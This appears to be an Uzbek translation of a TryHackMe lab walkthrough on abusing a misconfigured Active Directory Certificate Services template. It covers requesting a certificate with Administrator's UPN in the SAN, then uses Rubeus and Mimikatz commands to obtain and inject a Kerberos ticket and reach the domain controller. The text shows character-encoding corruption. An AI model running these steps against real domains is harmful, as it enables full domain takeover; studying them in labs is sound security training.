
# ğŸ” AD CS orqali imtiyoz koâ€˜tarish â€” Oâ€˜zbekcha tarjima

THMSERVER2 ga kirishni qoâ€˜lga kiritganimizdan soâ€˜ng, biz AD ekspluatatsiyasi boâ€˜yicha safarimizni davom ettirdik va barcha Tier 1 aktivlarni (serverlar) egalladik. Ammo yana bir bor yuqori bosqichga (Tier 0) oâ€˜tish uchun oddiy usul yoâ€˜q. Shu sababli yana ijodiy yondashuv kerak boâ€˜ladi.

**SpecterOps** tomonidan oâ€˜tkazilgan tadqiqotlar va whitepaper shuni koâ€˜rsatdiki, notoâ€˜gâ€˜ri sozlangan **certificate template** lar orqali imtiyoz koâ€˜tarish yoki lateral harakat qilish mumkin. Sertifikat xatoliklarini chuqurroq tushunmoqchi boâ€˜lsangiz â€“ ushbu TryHackMe xonasiga qarang.

---

# ğŸ› Active Directory Certificate Services (AD CS)

AD CS â€” Microsoftâ€™ning PKI (Public Key Infrastructure) implementatsiyasi. AD tashkilot ichida ishonch manbai boâ€˜lgani uchun, AD CS koâ€˜plab maqsadlarda ishlatiladi:

* Fayl tizimlarini shifrlash
* Raqamli imzo yaratish va tekshirish
* Hatto foydalanuvchi autentifikatsiyasi

Bu esa hujumchilar uchun juda jozibali yoâ€˜l ochadi.

AD CS odatda **Domain Controller** larda ishlaydi va oddiy foydalanuvchilar toâ€˜gâ€˜ridan-toâ€˜gâ€˜ri unga murojaat qila olmaydi. Biroq tashkilotlar katta boâ€˜lgani uchun, adminlar har bir sertifikatni qoâ€˜lda yaratmaydi â€” bu yerda **certificate template** lar ishga kiradi.

Template lar notoâ€˜gâ€˜ri sozlansa â€” juda â€œzaharlanganâ€ kombinatsiyalar paydo boâ€˜lib, ular orqali hujumchi imtiyoz koâ€˜tarishi mumkin.

---

# ğŸ“Œ Muhim atamalar

* **PKI** â€” Sertifikatlar va public-key kriptografiyasini boshqarish tizimi
* **AD CS** â€” Microsoft PKI tizimi
* **CA (Certificate Authority)** â€” Sertifikatlarni chiqaruvchi server
* **Certificate Template** â€” Sertifikatni qachon va qanday yaratish boâ€˜yicha qoidalar
* **CSR** â€” Sertifikat yaratish uchun yuboriladigan soâ€˜rov
* **EKU** â€” Sertifikatning ishlatilish maqsadini koâ€˜rsatadigan identifikatorlar

---

# ğŸ” Zaif Certificate Template ni topish

THMSERVER2 da RDP orqali PowerShell ochamiz va:

```
certutil -Template -v > templates.txt
```

Bu barcha template lar haqidagi maâ€™lumotni chiqaradi. Bizning maqsad â€” parametrlar kombinatsiyasi â€œzaharlanganâ€ boâ€˜lgan template ni topish.

**Misconfig deb hisoblanadigan toâ€˜rt parametr kombinatsiyasi:**

1. Sertifikat **Client Authentication** uchun ishlatilishi mumkin
2. **SAN (Subject Alternative Name)** ni biz oâ€˜zimiz belgilay olamiz
3. Sertifikat **private key bilan eksport qilinadigan** boâ€˜lishi kerak
4. Bizda ushbu templateâ€™dan foydalanish huquqi boâ€˜lishi kerak

Bu xona misolida **Template[32]** zaif template hisoblanadi.

---

# ğŸ”¨ Zaif Certificate Templateâ€™dan foydalanish

THMSERVER2 dagi MMC orqali sertifikat yaratamiz.

### 1. MMC ni ochish

* Start â†’ Run â†’ `mmc`
* File â†’ Add/Remove Snap-in
* **Certificates â†’ Computer Account â†’ Local Computer**

### 2. Yangi sertifikat talab qilish

* Personal â†’ All Tasks â†’ Request New Certificate
* AD Enrollment Policy ni tanlaymiz

Bizga koâ€˜rinadigan yagona template bor, ammo ungacha qoâ€˜shimcha maâ€™lumot kiritish zarur.

### 3. Qoâ€˜shimcha maâ€™lumotlar

* **Subject name** â†’ Type: *Common Name* â†’ istalgan qiymat
* **Alternative name** â†’ Type: *User Principal Name*

UPN ga **[Administrator@za.tryhackme.loc](mailto:Administrator@za.tryhackme.loc)** ni yozamiz â€” yaâ€™ni, biz *Domain Administrator* ni oâ€˜zimizga â€œimkonan olamizâ€.

Keyin:

* Apply
* OK
* Enroll

Sertifikat yaratildi.

### 4. Sertifikatni private key bilan eksport qilish

* Sertifikatga Right-click â†’ All Tasks â†’ Export
* **Yes, export the private key**
* Parol oâ€˜rnating
* `.pfx` fayl sifatida saqlang

---

# ğŸ­ Sertifikat orqali userni â€œimpersonateâ€ qilish

Buning uchun ikki qadam:

1. Sertifikat yordamida **Kerberos TGT olish (PKINIT hujumi)**
2. Olingan TGT ni tizimga yuklab, autentifikatsiya qilish

Biz **Rubeus** dan foydalanamiz.

### Rubeus orqali TGT olish

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101
```

Parametrlar izohi:

* `/user` â€” kimni oâ€˜z oâ€˜rniga olishimiz
* `/certificate` â€” eksport qilingan .pfx
* `/password` â€” .pfx paroli
* `/outfile` â€” TGT saqlanadigan fayl
* `/dc` â€” CA xizmatiga ega Domain Controller

Bu bizga **Administrator** nomidan haqiqiy Kerberos TGT beradi.

---

# ğŸ— Mimikatz orqali TGT ni yuklash

```
mimikatz.exe
privilege::debug
kerberos::ptt administrator.kirbi
exit
```

Endi bizning tizimimiz Administrator sifatida autentifikatsiya qilingan.

### Test qilamiz:

```
dir \\THMDC.za.tryhackme.loc\c$\
```

Va biz Domain Controller ning C:\ diskiga kira olamiz â€” bu **Tier 0** kompromatidir.

---

# ğŸ‰ Xulosa

Biz AD CS dagi notoâ€˜gâ€˜ri sozlangan sertifikat templateâ€™dan foydalanib:

âœ” SAN ni oâ€˜zgartirib
âœ” Sertifikat yaratib
âœ” Administrator nomidan TGT olib
âœ” Domain Controllerga toâ€˜liq kirish huquqini qoâ€˜lga kiritdik

Bu bilan biz **butun child domainni toâ€˜liq egalladik**.

